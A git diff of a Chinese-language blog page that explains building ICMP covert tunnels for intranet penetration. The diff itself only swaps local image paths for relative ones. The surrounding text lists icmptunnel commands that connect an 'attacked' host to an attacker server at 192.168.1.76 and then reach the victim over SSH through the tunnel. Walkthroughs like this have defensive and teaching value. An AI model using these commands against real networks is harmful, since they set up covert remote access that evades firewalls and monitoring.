@@ -58,16 +58,17 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig tun0 <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
 
 <p>​    指定一个网卡tun0，用于给隧道服务器端分配一个IP地址(10.0.0.1)</p>
-<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200605103809033.png" alt="image-20200605103809033"></p>
+<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/13.png" alt="image-20200605103809033"></p>
 <p>​    </p>
 <p>​    被攻击者</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line"> ./icmptunnel <span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span></span><br></pre></td></tr></table></figure>
 
-<p>​    <img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200605103839133.png" alt="image-20200605103839133"></p>
+<p>​    <img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/14.png" alt="image-20200605103839133"></p>
 <p>​    连接上攻击者的icmptunnel服务端，然后再开一个终端，执行命令</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig tun0 <span class="number">10.0</span><span class="number">.0</span><span class="number">.2</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
 
-<p>​    指定IP地址为10.0.0.2<img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200605103855527.png" alt="image-20200605103855527"></p>
+<p>​    指定IP地址为10.0.0.2</p>
+<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/15.png" alt="image-20200605103855527"></p>
 <p>​    此时建立了icmp隧道，在服务器端通过ssh连接被攻击对象</p>
 <p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/12.png" alt="image-20200605104454685"></p>
 <h2 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h2><p>​    <code>ptunnel</code>就是工具<code>pingtunnel</code></p>
